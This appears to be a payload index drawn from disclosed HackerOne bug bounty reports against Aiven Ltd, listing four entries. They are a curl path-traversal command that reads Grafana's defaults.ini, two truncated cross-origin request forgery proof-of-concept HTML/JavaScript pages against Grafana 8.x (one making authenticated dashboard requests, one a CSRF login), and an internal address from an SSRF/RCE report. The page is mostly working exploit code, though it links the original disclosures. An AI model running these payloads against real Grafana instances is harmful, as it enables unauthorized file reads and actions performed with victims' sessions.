# Aiven Ltd

4 payloads.

### `0be76140`

```
curl --path-as-is https://grafana-303ca6f8-█████████.target.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
```

— [Zero day path traversal vulnerability in Grafana 8.x allows unauthenticated arbitrary local file read](https://hackerone.com/reports/1415820) · Aiven Ltd · [j0v](https://hackerone.com/j0v) · $1,000.0

### `cede262b`

```
<html>
  <head></head>
  <body>
<h1>cross-origin-request-forgery POC</h1>
<div id=statusdiv></div>
<script>

var victim_instance = "<vic_instance>";

function log_status(msg) {
  //status logger.
  let com = document.getElementById('statusdiv')
  com.innerHTML += "<h2>" + msg + "</h2>"
}

function dashboard_poc() {
	log_status("[*] Creating Dashboard")
	var url = `${victim_instance}/api/dashboards/db`
	fetch(url,
		{
			method:"POST",
			mode:"no-cors",
			credentials:"include",
			headers: {
		
```

— [0-day Cross Origin Request Forgery vulnerability in Grafana 8.x .](https://hackerone.com/reports/1458236) · Aiven Ltd · [abrahack](https://hackerone.com/abrahack)

### `c581fe07`

```
<html>
  <head></head>
  <body>
<h1>CSRF Login POC, you will be redirected in 20 seconds</h1>
<div id=statusdiv></div>
<script>

var attacker_instance = "<att_instance>";
var attacker_instance_username = "avnadmin";
var attacker_instance_password = "<att_password>";
var attacker_csrf_proxy = "<att_ssrf_url>";

var csrf_html = `
  <form enctype="text/plain" action="${attacker_instance}/login" method=POST>
  <input type="text" name='{"user":"${attacker_instance_username}","password":"${attacker_in
```

— [0-day Cross Origin Request Forgery vulnerability in Grafana 8.x .](https://hackerone.com/reports/1458236) · Aiven Ltd · [abrahack](https://hackerone.com/abrahack)

### `6ae93660`

```
localhost:6725
```

— [\[Kafka Connect\] \[JdbcSinkConnector\]\[HttpSinkConnector\] RCE by leveraging file upload via SQLite JDBC driver and SSRF to internal Jolokia](https://hackerone.com/reports/1547877) · Aiven Ltd · [jarij](https://hackerone.com/jarij) · $5,000.0
